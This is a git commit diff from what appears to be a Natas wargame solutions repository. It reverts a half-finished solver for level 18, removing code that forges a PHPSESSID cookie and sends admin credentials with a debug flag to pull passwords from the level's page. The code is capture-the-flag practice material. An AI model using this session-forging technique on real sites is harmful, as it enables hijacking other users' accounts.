97dac41d9b1c10f0100914974b5a969353d1f73e
Evan Johnson <evanj2357@gmail.com>
2021-09-10 14:54:20 -0700

    Revert commit bbe50f9f6eb7b33556b8ab53a39c241c479c90ba, it was merged too soon

--- solutions/natas18.py
+++ solutions/natas18.py
@@ -9,22 +9,7 @@ from natas_utils import *
 LEVEL = 18
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
-    # IDs are numbers in [1, 640]
-    max_id = 640
-
-    pw_list = []
-    with requests.Session() as session:
-        form_data = {
-            "debug": "1",
-            "username": "admin",
-            "password": "null",
-        }
-        session.cookies.set(name="PHPSESSID", value="0.1")
-        response = session.get(url, auth=login, params=form_data)
-        print(response.text)
-
-    pw_list = extract_candidate_passwords(response.text)
-    return try_level_login(LEVEL + 1, pw_list)
+    return None
 
 if __name__ == "__main__":
     url, login = load_level(LEVEL)
